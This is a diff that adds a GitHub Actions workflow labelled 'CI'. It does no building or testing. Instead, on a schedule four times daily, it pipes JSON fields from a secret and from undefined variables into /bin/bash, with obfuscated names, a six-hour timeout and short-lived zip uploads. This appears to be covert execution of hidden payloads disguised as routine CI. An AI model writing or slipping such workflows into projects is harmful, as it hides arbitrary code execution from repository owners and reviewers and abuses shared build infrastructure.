@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          wq063: ${{ secrets.wq063 }}
+        run: |
+          printf '%s' "$wq063" | jq -r .wfk40734 | /bin/bash
+          printf '%s' "$culu69882" | jq -r .l7 | /bin/bash
+          printf '%s' "$d3" | jq -r .dosuo3265 | /bin/bash
+          printf '%s' "$po8" | jq -r .ie321 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7hHLUL7q
+          path: "*.zip"
+          retention-days: 1
